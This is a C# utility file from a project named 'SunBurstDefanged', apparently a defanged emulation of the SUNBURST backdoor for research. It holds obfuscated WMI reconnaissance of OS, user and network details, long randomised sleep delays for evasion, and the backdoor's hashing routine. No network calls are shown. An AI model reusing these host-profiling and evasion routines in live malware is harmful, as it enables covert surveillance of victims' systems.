using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Management;

namespace SunBurstDefanged
{
	public static class Utilities
	{
		private static string osVersion = null;
		private static string osInfo = null;

		public static string GetOSVersion(bool full)
		{
			if (osVersion == null || osInfo == null)
			{
				try
				{
					// Select * From Win32_OperatingSystem
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==")))
					{
						ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						// Caption
						osInfo = managementObject.Properties[ZipHelper.Unzip("c04sKMnMzwMA")].Value.ToString();
						// OSArchitecture
						osInfo = osInfo + ";" + managementObject.Properties[ZipHelper.Unzip("8w92LErOyCxJTS4pLUoFAA==")].Value.ToString();
						// InstallDate
						osInfo = osInfo + ";" + managementObject.Properties[ZipHelper.Unzip("88wrLknMyXFJLEkFAA==")].Value.ToString();
						// Organization
						osInfo = osInfo + ";" + managementObject.Properties[ZipHelper.Unzip("8y9KT8zLrEosyczPAwA=")].Value.ToString();
						// RegisteredUser
						osInfo = osInfo + ";" + managementObject.Properties[ZipHelper.Unzip("C0pNzywuSS1KTQktTi0CAA==")].Value.ToString();
						// Version
						string text = managementObject.Properties[ZipHelper.Unzip("C0stKs7MzwMA")].Value.ToString();
						osInfo = osInfo + ";" + text;
						string[] array = text.Split(new char[]
						{
							'.'
						});
						osVersion = array[0] + "." + array[1];
					}
				}
				catch (Exception)
				{
					osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
					// [E] {0} {1} {2}
					osInfo = string.Format(ZipHelper.Unzip("i3aNVag2qFWoNgRio1oA"), Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
				}
			}
			if (!full)
			{
				return osVersion;
			}
			return osInfo;
		}

		public static string GetNetworkAdapterConfiguration()
		{
			string text = "";
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(
				// Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true
				ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==")))
				{
					foreach (ManagementObject obj in managementObjectSearcher.Get().Cast<ManagementObject>())
					{
						text += "\n";
						// Description
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c0ktTi7KLCjJzM8DAA=="));
						// MACAddress
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("83V0dkxJKUotLgYA"));
						// DHCPEnabled
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c/FwDnDNS0zKSU0BAA=="));
						// DHCPServer
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c/FwDghOLSpLLQIA"));
						// DNSHostName
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c/EL9sgvLvFLzE0FAA=="));
						// DNSDomainSuffixSearchOrder
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA=="));
						// DNSServerSearchOrder
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c/ELDk4tKkstCk5NLErO8C9KSS0CAA=="));
						// IPAddress
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("8wxwTEkpSi0uBgA="));
						// IPSubnet
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("8wwILk3KSy0BAA=="));
						// DefaultIPGateway
						text += GetManagementObjectProperty(obj, ZipHelper.Unzip("c0lNSyzNKfEMcE8sSS1PrAQA"));
					}
					result = text;
				}
			}
			catch (Exception ex)
			{
				result = text + ex.Message;
			}
			return result;
		}

		public static string GetManagementObjectProperty(ManagementObject obj, string property)
		{
			object value = obj.Properties[property].Value;
			string text;
			if (((value != null) ? value.GetType() : null) == typeof(string[]))
			{
				text = string.Join(", ", from v in (string[])obj.Properties[property].Value
										 select v.ToString());
			}
			else
			{
				object value2 = obj.Properties[property].Value;
				text = (((value2 != null) ? value2.ToString() : null) ?? "");
			}
			string str = text;
			return property + ": " + str + "\n";
		}

		public static void DelayMs(double minMs, double maxMs)
		{
			if ((int)maxMs == 0)
			{
				minMs = 1000.0;
				maxMs = 2000.0;
			}
			double num;
			for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= 2147483647.0; num -= 2147483647.0)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping execution for maximum value " + int.MaxValue + " Milliseconds. " + int.MaxValue / 1000 + "secs." + int.MaxValue / 60000 + "mins. [-x to bypass]");
				Thread.Sleep(int.MaxValue);
			}
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping execution for " + (int)num + " Milliseconds. " + (int)num / 1000 + "secs. " + (int)num / 60000 + "mins. [-x to bypass]");
			Thread.Sleep((int)num);
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Done Sleeping");
		}

		public static void DelayMin(int minMinutes, int maxMinutes)
		{
			if (Settings.bypassx)
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Bypassing time delays. By default this was between 30 and 120 minutes.");
			}
			else
			{

				if (maxMinutes == 0)
				{
					minMinutes = 30;
					maxMinutes = 120;
				}
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Sleeping minimum is " + minMinutes + "mins and maximum is " + maxMinutes + "mins.");
				Utilities.DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
			}
		}

		public static string Quote(string s)
		{
			if (s == null || !s.Contains(" ") || s.Contains("\""))
			{
				return s;
			}
			return "\"" + s + "\"";
		}

		public static string Unquote(string s)
		{
			if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
			{
				return s.Substring(1, s.Length - 2);
			}
			return s;
		}

		public static string ByteArrayToHexString(byte[] bytes)
		{
			StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
			foreach (byte b in bytes)
			{
				stringBuilder.AppendFormat("{0:x2}", b);
			}
			return stringBuilder.ToString();
		}

		public static byte[] HexStringToByteArray(string hex)
		{
			byte[] array = new byte[hex.Length / 2];
			for (int i = 0; i < hex.Length; i += 2)
			{
				array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			}
			return array;
		}

		public static ulong GetHash(string s)
		{
			ulong num = 14695981039346656037UL;
			try
			{
				foreach (byte b in Encoding.UTF8.GetBytes(s))
				{
					num ^= (ulong)b;
					num *= 1099511628211UL;
				}
			}
			catch
			{
			}
			return num ^ 6605813339339102567UL;
		}
	}
}
